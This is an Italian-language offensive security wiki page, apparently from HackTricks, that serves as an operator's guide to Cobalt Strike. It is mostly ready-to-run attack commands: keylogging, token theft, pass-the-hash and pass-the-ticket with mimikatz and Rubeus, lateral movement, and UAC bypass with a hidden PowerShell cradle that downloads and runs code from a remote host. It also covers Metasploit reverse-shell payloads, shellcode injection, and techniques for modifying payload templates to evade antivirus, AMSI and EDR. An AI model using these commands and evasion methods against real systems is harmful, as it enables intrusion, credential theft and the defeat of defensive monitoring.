# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, quindi puoi selezionare dove ascoltare, quale tipo di beacon usare (http, dns, smb...) e altro.

### Peer2Peer Listeners

I beacon di questi listener non devono comunicare direttamente con il C2: possono comunicare con esso tramite altri beacon.

`Cobalt Strike -> Listeners -> Add/Edit`, quindi devi selezionare i beacon TCP o SMB

* Il **beacon TCP imposta un listener sulla porta selezionata**. Per connetterti a un beacon TCP, usa il comando `connect <ip> <port>` da un altro beacon
* Il **beacon SMB ascolta su una pipename con il nome selezionato**. Per connetterti a un beacon SMB, devi usare il comando `link [target] [pipe]`.

### Generare e ospitare payload

#### Generare payload in file

`Attacks -> Packages ->`

* **`HTMLApplication`** per i file HTA
* **`MS Office Macro`** per un documento Office con una macro
* **`Windows Executable`** per un file .exe, .dll o un servizio .exe
* **`Windows Executable (S)`** per un file .exe, .dll o un servizio .exe **stageless** (meglio stageless che staged, meno IoC)

#### Generare e ospitare payload

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Genererà uno script/eseguibile per scaricare il beacon da Cobalt Strike in formati come bitsadmin, exe, powershell e python

#### Ospitare payload

Se hai già il file che vuoi ospitare su un web server, vai su `Attacks -> Web Drive-by -> Host File` e seleziona il file da ospitare e la configurazione del web server.

### Opzioni Beacon

<details>
<summary>Opzioni e comandi Beacon</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Impianti personalizzati / Linux Beacons

- A un agent personalizzato basta comunicare con il protocollo HTTP/S del Team Server di Cobalt Strike (profilo C2 malleable predefinito) per registrarsi, effettuare il check-in e ricevere task. Implementa gli stessi URI/header e la stessa crittografia dei metadati definiti nel profilo per riutilizzare l’interfaccia di Cobalt Strike per assegnare task e visualizzarne l’output.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Uno script Aggressor (ad es. `CustomBeacon.cna`) può gestire la generazione dei payload per il beacon non Windows, così gli operatori possono selezionare il listener e generare payload ELF direttamente dalla GUI.
- Esempi di handler di task Linux esposti al Team Server: `sleep`, `cd`, `pwd`, `shell` (esegue comandi arbitrari), `ls`, `upload`, `download` ed `exit`. Corrispondono agli ID dei task previsti dal Team Server e devono essere implementati lato server per restituire l’output nel formato corretto.
- Il supporto BOF su Linux può essere aggiunto caricando i Beacon Object Files in-process con [ELFLoader di TrustedSec](https://github.com/trustedsec/ELFLoader) (supporta anche i BOF in stile Outflank), consentendo l’esecuzione modulare delle attività di post-exploitation nel contesto e con i privilegi dell’implant, senza avviare nuovi processi.<sup>[[2]](#references)[[3]](#references)</sup>
  Per informazioni sui formati dei loader Linux e sulle limitazioni dei confini tra processi, con un esempio separato di assegnazione task BOF, consulta [Formati dei loader Linux BOF e confini tra processi](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Integra un handler SOCKS nel beacon personalizzato per mantenere la stessa capacità di pivoting dei Windows Beacons: quando l’operatore esegue `socks <port>`, l’implant dovrebbe aprire un proxy locale per instradare gli strumenti dell’operatore attraverso l’host Linux compromesso verso le reti interne.

## Opsec

### Execute-Assembly

**`execute-assembly`** usa un **processo sacrificabile** e la remote process injection per eseguire il programma indicato. È molto rumoroso perché per iniettare in un processo vengono usate alcune Win API che ogni EDR controlla. Tuttavia, esistono strumenti personalizzati che possono essere usati per caricare qualcosa nello stesso processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike puoi anche usare BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Lo script Aggressor `https://github.com/outflanknl/HelpColor` crea il comando `helpx` in Cobalt Strike, che aggiunge colori ai comandi per indicare se sono BOF (verde), Frok&Run (giallo) o ProcessExecution, injection o simili (rosso). Questo aiuta a capire quali comandi sono più stealth.

### Post-execution moderno in-process

Le versioni recenti aggiungono due alternative quando un BOF COFF classico è troppo limitato:

- **Beacon Interpreter** compila C sul Team Server in bytecode intermedio ed esegue quest’ultimo in una VM incorporata in Beacon. Il bytecode rimane un dato anziché diventare codice eseguibile nativo; in questo modo si evita l’allocazione aggiuntiva di memoria eseguibile e la transizione dei permessi da RW a RX normalmente necessarie per caricare un BOF. Gli script possono importare la Beacon API e dichiarare prototipi di Dynamic Function Resolution (DFR) in stile BOF.
- **BOF-PE** carica un EXE o una DLL completa nel Beacon corrente. Questo formato supporta le normali importazioni PE, la gestione delle eccezioni, funzionalità C++ più avanzate e librerie esterne, mantenendo al contempo la Beacon API. È più pesante di un piccolo BOF COFF, quindi usalo solo quando il runtime aggiuntivo è utile.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Questi meccanismi riducono i segnali legati al loader, non la telemetria generata dalle azioni dello script o dalle chiamate alle Windows API.<sup>[[8]](#references)</sup>

### Agire come utente

Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`: 

- Security EID 4624 - Controlla tutti gli accessi interattivi per individuare gli orari di attività abituali.
- System EID 12,13 - Controlla la frequenza degli arresti, degli avvii e delle sospensioni.
- Security EID 4624/4625 - Controlla i tentativi NTLM in ingresso validi e non validi.
- Security EID 4648 - Questo evento viene creato quando si usano credenziali in chiaro per accedere. Se è stato generato da un processo, il binario potrebbe contenere le credenziali in chiaro in un file di configurazione o nel codice.

Quando usi `jump` da Cobalt Strike, è meglio usare il metodo `wmi_msbuild` per far sembrare più legittimo il nuovo processo.

### Usare account computer

È comune che i defender controllino i comportamenti anomali generati dagli utenti ed **escludano dal monitoraggio gli account di servizio e gli account computer come `*$`**. Puoi usare questi account per il movimento laterale o l'escalation dei privilegi.

### Usare payload stageless

I payload stageless sono meno rumorosi di quelli staged perché non devono scaricare un secondo stage dal server C2. Ciò significa che non generano traffico di rete dopo la connessione iniziale e che, quindi, è meno probabile che vengano rilevati dalle difese basate sulla rete.

### Token e archivio dei token

Fai attenzione quando rubi o generi token, perché un EDR potrebbe enumerare i token dei thread e rilevare un **token appartenente a un altro utente** o persino a SYSTEM all'interno del processo.

Questo permette di archiviare i token **per beacon**, così non è necessario rubare più volte lo stesso token. È utile per il movimento laterale o quando devi usare più volte un token rubato:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Quando ti sposti lateralmente, di solito è meglio **rubare un token invece di generarne uno nuovo** o eseguire un attacco pass the hash.

### Guardrails

Cobalt Strike ha una funzionalità chiamata **Guardrails** che aiuta a impedire l'uso di determinati comandi o azioni che i defender potrebbero rilevare. Guardrails può essere configurato per bloccare comandi specifici, come `make_token`, `jump`, `remote-exec` e altri comunemente usati per il movimento laterale o l'escalation dei privilegi.

Inoltre, il repository [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contiene anche alcuni controlli e idee da considerare prima di eseguire un payload.

### Crittografia dei ticket

In un AD, fai attenzione alla crittografia dei ticket. Per impostazione predefinita, alcuni strumenti usano la crittografia RC4 per i ticket Kerberos, che è meno sicura della crittografia AES. Negli ambienti aggiornati, AES è l'impostazione predefinita. I defender che monitorano gli algoritmi di crittografia deboli possono rilevare questa scelta.

### Evitare i valori predefiniti

Quando usi Cobalt Strike, per impostazione predefinita le pipe SMB hanno i nomi `msagent_####` e `"status_####`. Cambia questi nomi. Puoi controllare i nomi delle pipe esistenti da Cobalt Strike con il comando: `ls \\.\pipe\`

Inoltre, nelle sessioni SSH viene creata una pipe chiamata `\\.\pipe\postex_ssh_####`. Cambiala con `set ssh_pipename "<new_name>";`.

Anche nell'attacco di post-exploitation, le pipe `\\.\pipe\postex_####` possono essere modificate con `set pipename "<new_name>"`.

Nei profili di Cobalt Strike puoi anche modificare aspetti come:

- Evitare l'uso di `rwx`
- Il funzionamento del comportamento di process injection (quali API verranno usate) nel blocco `process-inject {...}`
- Il funzionamento di "fork and run" nel blocco `post-ex {…}`
- Il tempo di sleep
- La dimensione massima dei binari da caricare in memoria
- L'impronta di memoria e il contenuto della DLL con il blocco `stage {...}`
- Il traffico di rete

### Sleepmask e BeaconGate

Sleepmask trasforma Beacon e le allocazioni heap tracciate mentre è inattivo, quindi li ripristina per l'esecuzione dei task. Le versioni attuali offrono un'impostazione predefinita evasiva, ma i BOF Sleepmask personalizzati restano utili quando i requisiti relativi al layout della memoria, alle allocazioni o allo stack di chiamate sono diversi. Dalla versione 4.13, Sleepmask predefinito falsifica anche l'indirizzo di ritorno delle API inoltrate tramite BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** estende questo meccanismo oltre `Sleep`: le chiamate WinAPI selezionate vengono rappresentate come strutture `FUNCTION_CALL` e inoltrate al BOF Sleepmask, che può mascherare Beacon durante l'esecuzione della chiamata. Il profilo può applicare il gating a un gruppo (`Comms`, `Core`, `Cleanup` o `All`) oppure solo a singole API:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

Per un'API elencata in `beacon_gate`, il gate ha la precedenza su `syscall_method`; le API non elencate possono comunque usare il metodo syscall configurato. `beacon_gate disable` e `beacon_gate enable` attivano e disattivano la funzionalità durante l'esecuzione. Evita di abilitare `All` alla cieca: comandi come `ps` chiamano ripetutamente `OpenProcess`/`CloseHandle` e possono causare un picco nell'utilizzo della CPU quando ogni chiamata maschera e smaschera Beacon. Sleepmask-VS fornisce uno stato Beacon/Sleepmask simulato per il debug di gate personalizzati, senza doverli testare ripetutamente tramite un implant attivo.<sup>[[9]](#references)</sup>

### Proc injections rumorose

L'iniezione di codice in un processo è solitamente molto rumorosa, perché **di norma nessun processo esegue questa azione e i metodi per farlo sono molto limitati**. Di conseguenza, i sistemi di rilevamento basati sul comportamento potrebbero individuarla. Inoltre, gli EDR potrebbero rilevarla analizzando la rete alla ricerca di **thread contenenti codice non presente su disco** (anche se processi come i browser, che usano JIT, ne hanno spesso). Esempio: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | relazioni PID e PPID

Quando si avvia un nuovo processo, è importante **mantenere una normale relazione padre-figlio** tra i processi per evitare il rilevamento. Se svchost.exec esegue iexplorer.exe, sembrerà sospetto, poiché in un normale ambiente Windows svchost.exe non è il processo padre di iexplorer.exe.

Quando Cobalt Strike avvia un nuovo beacon, per impostazione predefinita crea un processo che usa **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto furtivo e gli EDR possono rilevarlo facilmente. Inoltre, `rundll32.exe` viene eseguito senza argomenti, il che lo rende ancora più sospetto.

Con il seguente comando di Cobalt Strike, puoi specificare un processo diverso per avviare il nuovo beacon, rendendolo meno rilevabile:

```bash
spawnto x86 svchost.exe
```

Puoi anche modificare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.

### Proxy del traffico degli attaccanti

A volte gli attaccanti devono poter eseguire strumenti localmente, anche su macchine Linux, e fare in modo che il traffico delle vittime raggiunga lo strumento (ad es. NTLM relay).

Inoltre, a volte, per eseguire un attacco pass-the.hash o pass-the-ticket, è più stealthy per l'attaccante **aggiungere localmente questo hash o ticket al proprio processo LSASS** e poi fare pivot da lì, invece di modificare un processo LSASS di una macchina vittima.

Tuttavia, devi fare **attenzione al traffico generato**, perché potresti inviare traffico insolito (Kerberos?) dal processo backdoor. Per questo potresti fare pivot verso un processo del browser (anche se potresti essere scoperto mentre ti inietti in un processo, quindi pensa a un modo stealth per farlo).


### Evitare gli AV

#### Bypass di AV/AMSI/ETW

Consulta la pagina:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Di solito, in `/opt/cobaltstrike/artifact-kit` puoi trovare il codice e i template precompilati (in `/src-common`) dei payload che Cobalt Strike userà per generare i beacon binari.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con il backdoor generato (o semplicemente con il template compilato), puoi trovare cosa fa scattare Defender. Di solito è una stringa. Puoi quindi modificare il codice che genera il backdoor in modo che quella stringa non compaia nel binario finale.

Dopo aver modificato il codice, esegui semplicemente `./build.sh` dalla stessa directory e copia la cartella `dist-pipe/` nel client Windows in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Non dimenticare di caricare lo script aggressive `dist-pipe\artifact.cna` per indicare a Cobalt Strike di usare le risorse dal disco che vogliamo, anziché quelle già caricate.

#### Kit di risorse

La cartella ResourceKit contiene i template per i payload basati su script di Cobalt Strike, tra cui PowerShell, VBA e HTA.

Usando [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) con i template, puoi scoprire cosa non piace a Defender (in questo caso, ad AMSI) e modificarlo:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modificando le righe rilevate è possibile generare un template che non verrà rilevato.

Non dimenticare di caricare lo script aggressivo `ResourceKit\resources.cna` per indicare a Cobalt Strike di usare le risorse dal disco che vogliamo, e non quelle già caricate.

#### Function hooks | Syscall

Il function hooking è un metodo molto comune usato dagli EDR per rilevare attività malevole. Cobalt Strike consente di aggirare questi hook usando **syscalls** invece delle chiamate standard alle API di Windows tramite la configurazione **`None`**, usando la versione `Nt*` di una funzione con l'impostazione **`Direct`** oppure semplicemente saltando la funzione `Nt*` con l'opzione **`Indirect`** nel profilo malleable. A seconda del sistema, un'opzione potrebbe essere più stealth delle altre.

È possibile impostarlo nel profilo o usando il comando **`syscall-method`**.

Tuttavia, questa tecnica potrebbe anche generare rumore.

Una delle opzioni offerte da Cobalt Strike per aggirare i function hook è rimuoverli con [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

È anche possibile verificare quali funzioni sono sottoposte a hook con [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) o [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Comandi vari di Cobalt Strike</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Cobalt Strike Linux Beacon (PoC di implant personalizzato)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [ELFLoader e Linux BOFs di TrustedSec](https://github.com/trustedsec/ELFLoader)
- [3] [Modello BOF nix di Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Analisi di Unit42 della cifratura dei metadati di Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Diario SANS ISC sul traffico di Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [CobaltStrikeParser di SentinelOne](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Perso nella traduzione](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Attraverso il BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
